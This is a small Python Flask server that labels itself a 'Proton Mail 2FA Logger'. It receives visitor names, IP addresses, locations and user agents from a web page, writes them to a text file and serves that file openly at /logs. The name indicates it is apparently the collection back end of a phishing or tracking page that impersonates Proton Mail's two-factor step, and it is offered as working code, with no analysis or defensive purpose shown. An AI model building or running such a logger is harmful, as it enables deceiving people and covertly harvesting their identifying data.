from flask import Flask, request, send_file
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # Enable CORS

@app.route('/')
def home():
    return "Proton Mail 2FA Logger is running 🎯"

@app.route('/log-ip', methods=['POST'])
def log_ip():
    data = request.json
    print("🚨 Received data:", data)

    timestamp = datetime.now().isoformat()
    log_entry = f"{timestamp} - Name: {data.get('name')} | IP: {data.get('ip')} | {data.get('city')}, {data.get('country')} | UA: {data.get('userAgent')}\n"

    print("🔍 Writing to:", os.path.abspath("visitor_logs.txt"))

    with open("visitor_logs.txt", "a") as f:
        f.write(log_entry)

    return "Logged", 200

@app.route('/logs')
def view_logs():
    return send_file("visitor_logs.txt", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)

